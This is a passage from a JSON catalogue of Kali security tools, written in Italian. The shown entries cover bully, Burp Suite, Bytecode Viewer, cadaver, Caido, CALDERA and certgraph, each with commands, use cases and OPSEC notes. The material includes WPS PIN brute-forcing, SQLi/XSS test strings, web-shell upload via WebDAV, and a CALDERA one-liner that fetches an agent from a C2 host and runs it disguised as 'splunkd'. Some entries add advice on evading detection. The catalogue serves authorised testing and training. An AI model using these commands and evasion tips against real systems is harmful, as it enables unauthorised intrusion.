Forza continuazione anche se AP sembra locked\nbully -b AA:BB:CC:DD:EE:FF -c 6 -F wlan0mon\n\n# === SESSION RECOVERY ===\n# Salva automaticamente in ~/.bully/\n# Per riprendere, usa stesso comando\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# === WORKFLOW COMPLETO ===\n# 1. Scan per target WPS\nwash -i wlan0mon -C  # Con color\n\n# 2. Prova Pixie-Dust su target interessanti\nfor bssid in AA:BB:CC:DD:EE:FF BB:CC:DD:EE:FF:00; do\n  timeout 60 bully -b $bssid -c 6 -d wlan0mon\ndone\n\n# 3. Se Pixie-Dust fallisce, brute force (patience...)\nbully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon\n\n# Output successo:\n# [+] WPS PIN: 12345678\n# [+] WPA PSK: MySecretPassword123</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, alternativa quando password WPA è troppo complessa per dictionary attack. Pixie-Dust è devastante su router vulnerabili.</p><p>Per <strong>Home/SOHO Assessment</strong>, molti router consumer hanno ancora WPS abilitato di default - quick win frequente.</p><p>In <strong>Security Audit</strong>, verifica che WPS sia disabilitato su AP aziendali come da best practice.</p><p>Per <strong>CTF Wireless</strong>, challenge WPS sono comuni e Bully è più stabile di Reaver.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Router moderni bloccano dopo 3-10 tentativi falliti. Timeout 60-300 secondi. Attacco può richiedere ore/giorni.</p><p><strong>WPS Locked:</strong> Alcuni AP disabilitano WPS permanentemente dopo troppi tentativi. Verifica stato con wash.</p><p><strong>Logging:</strong> Ogni tentativo WPS è loggato dall'AP. Attività facilmente rilevabile.</p><p><strong>Chipset Support:</strong> Pixie-Dust funziona solo su chipset specifici (Ralink RT, Realtek RTL, alcuni Broadcom). Non universale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "burpsuite-kali",
    "name": "burpsuite",
    "version": "2025.7.4",
    "icon": "../app/icons/burpsuite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/burpsuite/",
    "desc": "Piattaforma integrata per web security testing: proxy, scanner, repeater, intruder.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Burp Suite di PortSwigger è lo standard industriale per web application security testing, utilizzato dalla maggioranza dei pentester e bug bounty hunter. Funziona come proxy HTTP/HTTPS intercettante che permette di analizzare, modificare, ripetere e automatizzare richieste. La versione Community offre tool manuali essenziali (Proxy, Repeater, Intruder base, Decoder, Comparer), mentre Pro aggiunge scanner automatico con AI, Intruder illimitato, collaborazione team, e estensioni avanzate. L'ecosistema BApp Store offre centinaia di estensioni per casi specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Proxy:</strong> Intercetta e modifica richieste/risposte HTTP(S) in tempo reale. Match & Replace rules per modifiche automatiche, WebSocket support, HTTP/2 support.</p><p><strong>Repeater:</strong> Modifica e rinvia singole richieste manualmente con syntax highlighting e auto-formatting. Essenziale per SQLi, XSS, IDOR testing.</p><p><strong>Intruder:</strong> Automatizza attacchi con payload multipli: Sniper (single position), Battering Ram (same payload all positions), Pitchfork (parallel), Cluster Bomb (combinatorial).</p><p><strong>Scanner (Pro):</strong> Rileva automaticamente OWASP Top 10 con ottima precisione. Scan passivo durante navigazione + scan attivo su richiesta.</p><p><strong>Collaborator (Pro):</strong> Server esterno per rilevare vulnerabilità blind (SSRF, XXE, blind SQLi) via DNS/HTTP callback.</p><p><strong>Sequencer:</strong> Analizza randomness di token (session ID, CSRF token) per identificare debolezze crittografiche.</p><p><strong>Decoder:</strong> Encode/decode rapido: URL, Base64, HTML entities, hex, gzip, e catene di trasformazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP ===\n# Avvio Burp Suite\nburpsuite  # Community\njava -jar burpsuite_pro.jar  # Pro\n\n# === CONFIGURAZIONE BROWSER ===\n# Proxy: 127.0.0.1:8080\n# Firefox: Settings > Network Settings > Manual proxy\n# Chrome: usa estensione FoxyProxy o SwitchyOmega\n\n# Installare certificato CA per HTTPS:\n# 1. Naviga a http://burp (con proxy attivo)\n# 2. Download CA Certificate\n# 3. Importa in browser: Settings > Certificates > Import\n\n# === WORKFLOW TIPICO ===\n# 1. DISCOVERY\n# - Naviga l'applicazione con proxy attivo\n# - Target > Site map popola automaticamente\n# - Spider (Pro) per crawling automatico\n\n# 2. ANALISI\n# - HTTP History: review tutte le richieste\n# - Filtra per: parametri, metodo, response code\n# - Send to Repeater richieste interessanti\n\n# 3. TESTING MANUALE (Repeater)\n# - Modifica parametri\n# - Test injection: ' OR 1=1--, <script>alert(1)</script>\n# - Analizza response per confermare vulnerabilità\n\n# 4. AUTOMAZIONE (Intruder)\n# - Positions: marca parametri da fuzzare §param§\n# - Payloads: wordlist, numeri, custom\n# - Attack: lancia e analizza risultati\n\n# 5. SCAN AUTOMATICO (Pro)\n# - Click destro > Scan\n# - Review Issues trovate\n# - Verifica manualmente false positives\n\n# === TIPS & TRICKS ===\n# Scope: definisci scope per filtrare rumore\n# Target > Scope > Add > *.target.com\n\n# Match & Replace: auto-modify requests\n# Proxy > Options > Match & Replace\n# Es: User-Agent, Authorization header\n\n# Macro: automatizza login flow\n# Project options > Sessions > Macros\n\n# === ESTENSIONI ESSENZIALI ===\n# BApp Store > installa:\n# - Autorize (IDOR/authorization testing)\n# - Logger++ (advanced logging)\n# - Param Miner (hidden parameter discovery)\n# - JWT Editor (JWT manipulation)\n# - Turbo Intruder (fast fuzzing)\n# - Active Scan++ (enhanced scanner)</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Strumento <strong>imprescindibile</strong> per ogni web pentest e bug bounty - copre l'intero workflow dalla discovery all'exploitation.</p><p>Per <strong>API Testing</strong>, analizza REST/GraphQL/SOAP con syntax highlighting e manipulation facile.</p><p>In <strong>Mobile App Testing</strong>, configura come proxy per intercettare traffico app mobile.</p><p>Per <strong>Authentication Testing</strong>, macro e session handling permettono test complessi su flussi multi-step.</p><p>In <strong>Security Training</strong>, ideale per imparare web security con feedback visivo immediato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>WAF Detection:</strong> Scanner Pro genera pattern riconoscibili. WAF possono bloccare o alertare. Usare throttling e User-Agent rotation.</p><p><strong>Certificate Pinning:</strong> App mobile con certificate pinning rifiutano cert Burp. Serve bypass (Frida, objection).</p><p><strong>Scope Control:</strong> Senza scope definito, Burp può scansionare/attaccare domini fuori target. Sempre configurare scope.</p><p><strong>Session Data:</strong> Project file contiene tutto il traffico intercettato. Proteggere e cancellare dopo engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "bytecode-viewer",
    "name": "bytecode-viewer",
    "version": "2.13.1",
    "icon": "../app/icons/bytecode-viewer-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/bytecode-viewer/",
    "desc": "Decompila e analizza bytecode Java, Android DEX con più decompiler integrati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bytecode Viewer è un IDE per reverse engineering di applicazioni Java e Android che integra sei decompilatori diversi (Procyon, CFR, JD-GUI, FernFlower, Krakatau, JADX-Core) permettendo confronto side-by-side per ottenere la migliore ricostruzione del codice. Supporta JAR, CLASS, DEX, APK, ZIP e mostra simultaneamente: bytecode JVM/Dalvik raw, codice decompilato, e smali disassembly. Include editor esadecimale, ricerca full-text, e sistema plugin per estensioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>6 Decompilers:</strong> Procyon, CFR, JD-GUI, FernFlower (IntelliJ), Krakatau, JADX - confronto side-by-side per ogni classe.</p><p><strong>Bytecode View:</strong> Visualizza JVM bytecode raw, Dalvik bytecode, e Smali disassembly per analisi low-level.</p><p><strong>Multi-Format:</strong> Apre JAR, WAR, EAR, CLASS, DEX, APK, ZIP con navigazione struttura automatica.</p><p><strong>Search Engine:</strong> Ricerca full-text nel codice decompilato: stringhe, metodi, classi, regex.</p><p><strong>Hex Editor:</strong> Editor esadecimale integrato per patch binari diretti.</p><p><strong>Plugin System:</strong> Estensibile con plugin Java per analisi custom, detection obfuscation, malware signatures.</p><p><strong>Export:</strong> Esporta codice decompilato come progetto Java compilabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\njava -jar BytecodeViewer.jar\n# Oppure con più RAM per JAR grandi\njava -Xmx2G -jar BytecodeViewer.jar\n\n# === APERTURA FILE ===\n# File > Add... > seleziona JAR/APK/CLASS\n# Drag & drop supportato\n\n# === NAVIGAZIONE ===\n# Panel sinistro: tree struttura classi\n# Panel centrale: codice decompilato\n# Click classe per visualizzare\n\n# === CONFIGURAZIONE DECOMPILER ===\n# View > Pane 1/2/3: seleziona decompiler\n# Raccomandato: Procyon + CFR + FernFlower\n# Confronta output per codice più leggibile\n\n# === RICERCA ===\n# Search > Search\n# Trova: stringhe, metodi, classi\n# Regex supportato\n\n# Cerca stringhe interessanti:\n# - password, secret, key, token\n# - http://, https://, jdbc:\n# - encrypt, decrypt, hash\n\n# === WORKFLOW MALWARE ANALYSIS ===\n# 1. Apri JAR sospetto\n# 2. Cerca: URL, IP, domini\n# 3. Identifica entry point (main, applet)\n# 4. Traccia flusso di esecuzione\n# 5. Identifica payload/comportamento\n\n# === WORKFLOW APK ANALYSIS ===\n# 1. Apri APK\n# 2. Naviga: classes.dex > com.target.app\n# 3. Cerca: SharedPreferences, SQLite\n# 4. Identifica API keys hardcoded\n# 5. Analizza network calls (Retrofit, OkHttp)\n\n# === EXPORT ===\n# File > Save As > Java (decompiled)\n# Crea progetto importabile in IDE\n\n# === PLUGIN ===\n# Plugins > Plugin Console\n# Scrivi Java per automazione analisi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, analizza JAR malevoli (ransomware Java, RAT, droppers) distribuiti via phishing o exploit kits.</p><p>In <strong>Mobile Security</strong>, reverse engineering di app Android per trovare: API keys hardcoded, vulnerabilità logiche, bypass di controlli.</p><p>Per <strong>Vulnerability Research</strong>, analizza librerie Java (Struts, Spring, Log4j) per trovare sink/source di vulnerabilità.</p><p>In <strong>CTF</strong>, challenge Java/Android richiedono decompilazione per trovare flag o capire logica.</p><p>Per <strong>License Bypass</strong> (solo software proprio), identifica controlli di licenza per debugging.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Obfuscation:</strong> ProGuard, DexGuard, Zelix KlassMaster rendono output illeggibile. Nomi metodi/variabili persi (a, b, c).</p><p><strong>Native Code:</strong> JNI/.so libraries non sono analizzabili - serve Ghidra/IDA.</p><p><strong>Memory:</strong> JAR grandi (>100MB) richiedono RAM significativa. Aumentare -Xmx.</p><p><strong>Legal:</strong> Reverse engineering può violare EULA/DMCA. Solo per security research autorizzato o software proprio.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "cadaver",
    "name": "cadaver",
    "version": "0.26",
    "icon": "../app/icons/cadaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cadaver/",
    "desc": "Client WebDAV da linea di comando per upload, download e gestione file remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cadaver e un client WebDAV a linea di comando che consente di interagire con server remoti tramite il protocollo Web Distributed Authoring and Versioning. Supporta operazioni complete di gestione file come upload, download, creazione di directory, copia, spostamento e cancellazione di risorse remote. Il tool si comporta in modo simile a un client FTP classico, offrendo una shell interattiva con comandi familiari. E particolarmente utile durante i penetration test quando si individua un endpoint WebDAV configurato in modo non sicuro. Cadaver supporta autenticazione Basic e Digest, nonche connessioni HTTPS per comunicazioni cifrate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Gestione file remota interattiva:</strong> Cadaver offre una shell interattiva con comandi intuitivi come get, put, mget, mput, ls, mkdir, delete e move. Questo permette di navigare la struttura delle directory remote e manipolare i file esattamente come si farebbe con un file system locale. La sintassi dei comandi e volutamente simile a quella di un client FTP tradizionale per ridurre la curva di apprendimento.</p><p><strong>Upload di web shell e payload:</strong> Durante un engagement offensivo, cadaver viene frequentemente utilizzato per caricare web shell su directory WebDAV scrivibili. Il comando put consente di trasferire file arbitrari sul server remoto, inclusi script PHP, ASP o JSP che forniscono esecuzione di comandi remota. Questa funzionalita rende cadaver uno strumento essenziale nella fase di exploitation di applicazioni web con WebDAV abilitato.</p><p><strong>Supporto autenticazione e SSL:</strong> Il tool supporta sia autenticazione HTTP Basic che Digest, permettendo l'accesso a risorse protette quando si dispone di credenziali valide. Le connessioni HTTPS sono supportate nativamente, consentendo l'interazione sicura con server che richiedono comunicazioni cifrate. E possibile anche specificare certificati client per scenari di autenticazione mutual TLS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Cadaver si avvia specificando l'URL del server WebDAV come argomento. Una volta connessi, si entra in una shell interattiva dove e possibile eseguire comandi di gestione file.</p><pre><code># Connessione a un server WebDAV\ncadaver http://target.com/webdav/\n\n# Upload di un file (dalla shell interattiva)\ndav:/webdav/> put shell.php\n\n# Download di un file\ndav:/webdav/> get config.bak\n\n# Elenco file nella directory corrente\ndav:/webdav/> ls\n\n# Creazione di una directory\ndav:/webdav/> mkdir uploads\n\n# Connessione con autenticazione\ncadaver https://target.com/webdav/\nUsername: admin\nPassword: ****</code></pre><p>Il file ~/.cadaverrc puo essere configurato per automatizzare comandi al momento della connessione. Le credenziali possono essere salvate in ~/.netrc per evitare inserimenti manuali ripetuti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel contesto di un penetration test web, cadaver viene utilizzato per verificare se le directory WebDAV scoperte durante la fase di enumerazione consentono l'upload di file arbitrari. Questo e uno dei vettori di attacco piu comuni per ottenere una web shell su server IIS o Apache con WebDAV configurato in modo permissivo. Un secondo caso d'uso riguarda l'esfiltrazione di dati da server WebDAV accessibili: una volta ottenute credenziali valide, e possibile scaricare documenti sensibili, file di configurazione e backup. Infine, cadaver e utile per la fase di post-exploitation quando un server compromesso espone condivisioni WebDAV interne, permettendo il movimento laterale attraverso l'upload di tool e payload su altri sistemi della rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le operazioni WebDAV generano log dettagliati sui web server (IIS, Apache). I metodi HTTP utilizzati da cadaver (PUT, DELETE, MKCOL, PROPFIND) sono distintivi e facilmente identificabili nei log di accesso. I sistemi IDS/IPS possono rilevare upload di file con estensioni sospette (.php, .asp, .jsp) tramite ispezione del payload HTTP.</p><p><strong>Impatto operativo:</strong> L'upload di web shell lascia artefatti permanenti sul file system del server. Le connessioni HTTP non cifrate espongono credenziali e contenuti dei file trasferiti in chiaro sulla rete. L'utilizzo di cadaver con il suo User-Agent predefinito facilita l'attribuzione dell'attivita.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre connessioni HTTPS per cifrare il traffico. Modificare il User-Agent per mimetizzarsi con client WebDAV legittimi (Microsoft Office, macOS Finder). Rimuovere immediatamente le web shell caricate dopo l'utilizzo. Preferire nomi di file che si confondano con il contenuto esistente della directory.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "caido-cli",
    "name": "caido-cli",
    "version": "0.49.0",
    "icon": "../app/icons/caido-cli-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caido-cli/",
    "desc": "Web proxy e security testing platform moderno, alternativa leggera a Burp.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Caido e una piattaforma moderna per il web security testing e il web proxying, progettata come alternativa leggera e performante a Burp Suite. Il componente CLI consente di controllare l'istanza Caido da terminale, facilitando l'integrazione in workflow automatizzati e pipeline di testing. A differenza dei proxy tradizionali, Caido utilizza un'architettura client-server con backend in Rust che garantisce prestazioni elevate anche con grandi volumi di traffico. L'interfaccia web e reattiva e moderna, con funzionalita di intercettazione, replay, fuzzing e analisi del traffico HTTP/HTTPS. Caido supporta nativamente plugin e automazioni tramite il suo sistema di workflow.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Intercettazione e modifica del traffico:</strong> Caido funziona come proxy MITM che intercetta tutto il traffico HTTP/HTTPS tra il browser e i server target. Ogni richiesta e risposta puo essere ispezionata, modificata e inoltrata in tempo reale. Il sistema di match-and-replace consente di applicare trasformazioni automatiche al traffico basate su regole configurabili, senza intervento manuale per ogni richiesta.</p><p><strong>Replay e fuzzing integrato:</strong> Il modulo Replay permette di ripetere singole richieste con modifiche ai parametri, header o body per testare manualmente le risposte del server. Il componente Automate consente di lanciare attacchi di fuzzing con payload personalizzati, simili all'Intruder di Burp Suite. I risultati vengono presentati in tabelle filtrabili con evidenziazione delle anomalie nelle risposte.</p><p><strong>CLI e automazione:</strong> Il componente caido-cli permette di avviare, fermare e configurare l'istanza Caido direttamente da terminale. Questo e particolarmente utile per l'integrazione con script di automazione, CI/CD pipeline e workflow personalizzati. La CLI supporta l'esportazione di progetti, la gestione delle impostazioni proxy e il controllo dello stato dell'istanza senza necessita di aprire l'interfaccia grafica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caido CLI si utilizza per gestire l'istanza del proxy. Una volta avviato, l'interfaccia web e accessibile dal browser per le operazioni interattive di testing.</p><pre><code># Avvio dell'istanza Caido\ncaido-cli start\n\n# Avvio su porta specifica\ncaido-cli start --port 8080\n\n# Verifica dello stato dell'istanza\ncaido-cli status\n\n# Arresto dell'istanza\ncaido-cli stop\n\n# Esportazione del progetto corrente\ncaido-cli export project -o output.caido\n\n# Configurazione proxy upstream\ncaido-cli config set proxy.upstream.url http://127.0.0.1:8888</code></pre><p>Dopo l'avvio, configurare il browser per utilizzare Caido come proxy (di default 127.0.0.1:8080) e installare il certificato CA di Caido per l'intercettazione HTTPS. L'interfaccia web sara accessibile all'indirizzo indicato nel terminale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Caido viene utilizzato principalmente durante i web application penetration test come proxy di intercettazione per analizzare il flusso di comunicazione tra client e server. Il testing manuale delle vulnerabilita come SQL injection, XSS e IDOR beneficia enormemente della capacita di modificare e ripetere le richieste con parametri diversi. Un secondo caso d'uso importante riguarda il fuzzing automatizzato di endpoint API, dove il modulo Automate permette di testare sistematicamente migliaia di combinazioni di input per identificare comportamenti anomali. Caido e inoltre apprezzato per audit di sicurezza su applicazioni moderne con API REST e GraphQL, dove la sua interfaccia reattiva e la gestione efficiente del traffico in formato JSON risultano superiori rispetto a tool piu datati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico generato attraverso Caido mantiene le caratteristiche delle richieste originali del browser, rendendo difficile il rilevamento basato sul proxy stesso. Tuttavia, attivita di fuzzing massivo generano pattern di traffico anomali facilmente identificabili da WAF e sistemi di rate limiting. Le scansioni automatizzate producono volumi di richieste inusuali che possono attivare alert di sicurezza.</p><p><strong>Impatto operativo:</strong> L'installazione del certificato CA di Caido modifica la trust chain del sistema. I progetti Caido salvati localmente contengono tutto il traffico intercettato, incluse credenziali e token di sessione in chiaro. La condivisione non sicura di file di progetto puo esporre dati sensibili del target.</p><p><strong>Mitigazioni:</strong> Limitare il rate delle richieste di fuzzing per evitare il rilevamento. Utilizzare profili browser dedicati con il certificato CA installato solo per il testing. Cifrare i file di progetto esportati e cancellarli in modo sicuro al termine dell'engagement. Configurare scope precisi per evitare l'intercettazione di traffico non pertinente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "caldera",
    "name": "caldera",
    "version": "5.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caldera/",
    "desc": "Framework MITRE per emulazione di avversari e red team automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CALDERA e un framework sviluppato dal MITRE per l'emulazione automatizzata di avversari e le operazioni di red team. Il sistema consente di pianificare e eseguire catene di attacco complete basate sulle tattiche, tecniche e procedure (TTP) del framework MITRE ATT&CK. CALDERA opera con un'architettura agente-server dove agenti leggeri vengono deployati sui sistemi target e ricevono istruzioni dal server C2 centrale. Il framework include una libreria di plugin e ability preconfigurate che coprono l'intero kill chain, dalla ricognizione all'esfiltrazione. E utilizzato sia per operazioni offensive che per la validazione dei controlli di sicurezza difensivi tramite purple teaming.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Operazioni autonome basate su ATT&CK:</strong> CALDERA permette di definire profili di avversario (adversary profiles) composti da ability mappate alle tecniche ATT&CK. Una volta lanciata un'operazione, il sistema esegue automaticamente la sequenza di attacco sugli agenti deployati, adattandosi dinamicamente ai risultati di ogni step. Il planner integrato decide quali ability eseguire successivamente in base ai fatti raccolti durante l'operazione.</p><p><strong>Agenti multi-piattaforma:</strong> Il framework fornisce diversi tipi di agenti (Sandcat in Go, Manx per reverse shell, Ragdoll in Python) che supportano Windows, Linux e macOS. Gli agenti comunicano con il server C2 tramite protocolli configurabili (HTTP, HTTPS, TCP, UDP) e supportano intervalli di beacon personalizzabili. Ogni agente puo eseguire comandi nativi del sistema operativo, PowerShell, bash o payload personalizzati.</p><p><strong>Plugin ed estensibilita:</strong> CALDERA offre un'architettura modulare basata su plugin. I plugin principali includono Stockpile (libreria di ability), Compass (visualizzazione ATT&CK), Access (initial access payloads), Response (azioni difensive automatiche) e Human (simulazione di attivita utente). E possibile sviluppare plugin personalizzati e ability custom per simulare TTP specifiche del threat model dell'organizzazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CALDERA si avvia come server web e si gestisce tramite l'interfaccia grafica o le API REST. Gli agenti vengono deployati sui sistemi target per ricevere ed eseguire i comandi.</p><pre><code># Avvio del server CALDERA\npython server.py --insecure --build\n\n# Accesso all'interfaccia web\n# http://localhost:8888 (default: admin/admin)\n\n# Generazione di un agente Sandcat via API\ncurl -X POST http://localhost:8888/api/v2/agents \\\n  -H 'KEY: ADMIN123' \\\n  -d '{\"platform\": \"linux\", \"agent\": \"sandcat\"}'\n\n# Deploy dell'agente sul target (esempio Linux)\nserver=\"http://c2-server:8888\"; curl -s -X POST $server/file/download \\\n  -d '{\"file\":\"sandcat.go\"}' -o splunkd; chmod +x splunkd; \\\n  ./splunkd -server $server -group red\n\n# Avvio di un'operazione via API\ncurl -X POST http://localhost:8888/api/v2/operations \\\n  -H 'KEY: ADMIN123' \\\n  -d '{\"name\": \"test-op\", \"adversary\": {\"adversary_id\": \"abc123\"}}'</code></pre><p>L'interfaccia web consente di creare adversary profile selezionando le ability desiderate, configurare le operazioni e monitorare l'esecuzione in tempo reale con output dettagliato per ogni step.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso primario di CALDERA e l'emulazione di avversari durante esercitazioni di red team, dove il framework automatizza l'esecuzione di catene di attacco complesse riducendo il tempo necessario per simulare un threat actor reale. Un secondo scenario fondamentale e il purple teaming: il blue team configura i controlli difensivi mentre il red team lancia operazioni CALDERA per verificare se le detection sono efficaci, creando un ciclo di miglioramento continuo. CALDERA viene inoltre utilizzato per il breach and attack simulation (BAS) continuativo, dove operazioni pianificate vengono eseguite periodicamente per validare che le difese rimangano efficaci nel tempo contro le tecniche ATT&CK rilevanti per l'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli agenti CALDERA generano pattern di beacon regolari verso il server C2 che possono essere identificati tramite analisi del traffico di rete. Le ability eseguono comandi e modifiche di sistema che producono telemetria rilevabile da EDR e SIEM. Molte ability di default utilizzano tecniche ben note che hanno signature nei principali prodotti di sicurezza.</p><p><strong>Impatto operativo:</strong> Il deployment di agenti su sistemi di produzione comporta rischi di stabilita se le ability eseguite non sono adeguatamente testate. Il server C2 contiene i risultati completi di tutte le operazioni, incluse credenziali raccolte e output sensibili. L'interfaccia web di default non utilizza HTTPS e le credenziali sono hardcoded.</p><p><strong>Mitigazioni:</strong> Configurare jitter sugli intervalli di beacon per evitare pattern regolari. Utilizzare HTTPS con certificati validi per le comunicazioni agente-server. Cambiare immediatamente le credenziali di default. Limitare il scope delle operazioni ai sistemi concordati e testare le ability in ambiente di laboratorio prima dell'esecuzione in produzione. Cancellare gli agenti e pulire gli artefatti al termine dell'operazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "certgraph",
    "name": "certgraph",
    "version": "20180911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certgraph/",
    "desc": "Esplora certificati SSL/TLS per scoprire sottodomini tramite SAN e CT logs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Certgraph e uno strumento di ricognizione passiva che esplora i certificati SSL/TLS per scoprire sottodomini e relazioni tra domini. Funziona analizzando i campi Subject Alternative Name (SAN) dei certificati e interrogando i Certificate Transparency (CT) logs per costruire un grafo delle connessioni tra domini. L'approccio e completamente passivo quando utilizza i CT logs, poiche non genera traffico diretto verso i target. Certgraph produce output in formato grafo che puo essere visualizzato con strumenti come Graphviz, rendendo immediatamente visibili le relazioni tra i domini dell'infrastruttura target. E particolarmente efficace per scoprire sottodomini nascosti che non sarebbero individuabili tramite brute-forcing DNS tradizionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Esplorazione ricorsiva dei certificati:</strong> Certgraph analizza i certificati SSL/TLS partendo da un dominio seed e segue ricorsivamente i domini trovati nei campi SAN di ogni certificato. Questo processo di crawling dei certificati permette di costruire una mappa completa dell'infrastruttura, scoprendo domini correlati che condividono certificati wildcard o multi-domain. La profondita di ricorsione e configurabile per bilanciare completezza e tempo di esecuzione.</p><p><strong>Integrazione con Certificate Transparency:</strong> Il tool interroga i CT logs pubblici (come crt.sh, Google CT, Censys) per recuperare certificati storici e attuali associati a un dominio. Questo approccio consente di scoprire sottodomini che potrebbero non essere piu attivi ma che rivelano informazioni sulla struttura dell'infrastruttura. I CT logs rappresentano una fonte di intelligence preziosa poiche contengono tutti i certificati emessi da Certificate Authority pubbliche.</p><p><strong>Output in formato grafo:</strong> Certgraph genera output in formato DOT (Graphviz) che rappresenta le relazioni tra domini come un grafo orientato. Ogni nodo rappresenta un dominio e ogni arco indica una relazione trovata tramite un certificato condiviso. Questo formato visuale e estremamente utile per comprendere rapidamente la topologia dell'infrastruttura e identificare punti di interesse per approfondimenti successivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Certgraph si utilizza specificando un dominio di partenza e le opzioni desiderate per il tipo di driver (sorgente dati) e il formato di output.</p><pre><code># Scansione base di un dominio\ncertgraph example.com\n\n# Utilizzo dei CT logs come sorgente\ncertgraph -driver crtsh example.com\n\n# Output in formato DOT per Graphviz\ncertgraph -output dot example.com > graph.dot\ndot -Tpng graph.dot -o graph.png\n\n# Limitare la profondita di ricorsione\ncertgraph -depth 3 example.com\n\n# Output JSON per elaborazione programmatica\ncertgraph -output json example.com\n\n# Scansione con timeout personalizzato\ncertgraph -timeout 10 example.com</code></pre><p>Per ottenere risultati ottimali, e consigliabile combinare piu driver (CT logs e connessione diretta) e regolare la profondita di ricorsione in base alla dimensione dell'infrastruttura target. L'output JSON puo essere processato con jq per estrarre liste di sottodomini.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso principale e la fase iniziale di ricognizione in un penetration test, dove certgraph viene utilizzato per mappare l'intera superficie di attacco scoprendo sottodomini tramite i certificati TLS. Questa tecnica e complementare al DNS brute-forcing e spesso rivela sottodomini interni, di sviluppo o staging che utilizzano certificati condivisi con i servizi di produzione. Un secondo caso d'uso riguarda l'analisi delle acquisizioni aziendali: esplorando i certificati e possibile scoprire relazioni tra domini apparentemente non correlati che condividono la stessa infrastruttura PKI. Certgraph e inoltre utile per il monitoraggio continuativo della superficie di attacco, dove scansioni periodiche permettono di identificare nuovi sottodomini e certificati emessi per l'organizzazione target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'utilizzo dei CT logs e completamente passivo e non genera traffico verso il target, rendendolo non rilevabile. Tuttavia, quando si utilizza il driver di connessione diretta, certgraph stabilisce connessioni TLS ai server target che vengono registrate nei log di accesso. Scansioni ricorsive con molte connessioni possono generare alert su sistemi di monitoraggio.</p><p><strong>Impatto operativo:</strong> Le informazioni raccolte tramite CT logs sono pubbliche e accessibili a chiunque, quindi l'analisi non ha impatto diretto sull'infrastruttura target. Le connessioni dirette ai server per recuperare i certificati sono operazioni TLS standard che non causano alcun impatto sulle risorse del target.</p><p><strong>Mitigazioni:</strong> Preferire i CT logs come sorgente primaria per mantenere la ricognizione completamente passiva. Se si utilizzano connessioni dirette, distribuire le richieste nel tempo e utilizzare indirizzi IP diversi. Evitare profondita di ricorsione eccessive che potrebbero generare un volume anomalo di connessioni TLS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "certipy-ad",
    "name": "certipy-ad",
